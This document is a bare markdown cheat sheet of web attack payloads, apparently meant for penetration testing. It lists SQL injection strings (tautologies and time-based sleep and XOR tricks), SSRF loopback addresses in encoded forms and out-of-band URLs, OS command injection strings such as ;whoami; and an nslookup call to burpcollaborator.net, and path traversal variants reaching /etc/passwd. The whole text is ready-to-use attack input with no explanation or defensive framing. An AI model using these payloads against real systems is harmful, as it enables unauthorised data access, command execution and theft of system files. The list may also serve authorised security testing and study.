## All Vulnerability Payloads
```sh
# SQLi
'+or+1=1--+-
+or+'1'='1'--+-
'+or+sleep(3)--+-
1'+or+sleep(3)--+-
1+or+sleep(3)--+-
1337-sleep(3)--+-
(select*from(select(sleep(3)))a)--+-
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z--+-
1'XOR(if(now()=sysdate(),sleep(3),0))OR'--+-
'+or+1=1
+or+'1'='1
'+or+sleep(3)
1'+or+sleep(3)
1+or+sleep(3)
1337-sleep(3)
(select*from(select(sleep(3)))a)
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
1'XOR(if(now()=sysdate(),sleep(3),0))OR'
"'+or+sleep(30)='"
127.0.0.1'+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))x)+AND+'1'='1
# SSRF
http://localhost/
http://127.0.0.1/
http://127.1
http://2130706433
http://017700000001
http://[::]:80/
http://burpcollaborator.net
http://localhost/?%0A
http://127.0.0.1/?%0A
http://127.1/?%0A
http://2130706433/?%0A
http://017700000001/?%0A
http://[::]:80/?%0A
http://burpcollaborator.net/?%0A
# OS command Injection
;whoami;
;sleep+10;
nslookup+burpcollaborator.net
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
# Path Traversal
../../../etc/passwd
..//..//..//..//etc/passwd
....//....//....//....//etc/passwd
/var/www/images/../../../etc/passwd
/var/www/images/..//..//..//..//etc/passwd
/var/www/images/....//....//....//....//etc/passwd
```
